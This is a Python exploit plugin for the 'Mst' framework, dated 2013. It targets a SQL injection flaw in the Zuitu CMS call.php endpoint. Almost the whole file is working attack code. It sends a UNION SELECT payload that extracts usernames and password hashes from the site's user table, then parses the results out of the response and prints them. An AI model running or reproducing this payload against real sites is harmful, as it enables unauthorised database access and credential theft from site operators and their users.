
# -*- coding: cp936 -*-
'''
Mst=>exploit=>plugin
Zuitu=>call.php=>SqlInject
'''
class mstplugin:
    '''Zuitu sqlinject'''
    infos = [
        ['插件','Zuitu call.php SqlInject Exp'],
        ['作者','teamtopkarl'],
        ['更新','2013/10/25'],
        ['网址','http://hi.baidu.com/teamtopkarl']
        ]
    opts  = [
        ['RURL','www.xxxxxx.com','目标URL'],
        ['RPATH','/api/','CMS路径'],
        ['RPORT','80','目标端口'],
        ['PAYLOAD','false',"不需要后攻击插件"]
        ]
    def exploit(self):
        '''start exploit'''
        if RPORT == '443':
            url = 'https://%s%s'%(RURL,RPATH)
        else:
            url = 'http://%s:%s%s'%(RURL,RPORT,RPATH)
        exp = url+"call.php?action=query&num=j8g'%29/**/union/**/select/**/1,2,3,concat(username,0x7e,password),5,6,7,8,9,10,11,12,13,14,15,16/**/from/**/user/**/limit/**/0,1%23"
        color.cprint("[*] Sending exp..",YELLOW)
        ok  = fuck.urlget(exp)
        if ok.getcode() == 200:
            tmp=fuck.find('[>]+\w+[~]+\w+[<]+',ok.read())
            if len(tmp)>0:
                color.cprint("[*] Exploit Successful !",GREEN)
                i=1
                for res in tmp:
                    res=res[1:len(res)-1]
                    color.cprint("[%s] %s"%(i,res),GREEN)
                    i+=1
            else:
                color.cprint("[!] TARGET NO VULNERABLE !",RED)
        else:
            color.cprint("[!] EXPLOIT FALSE ! CODE:%s"%ok.getcode(),RED)
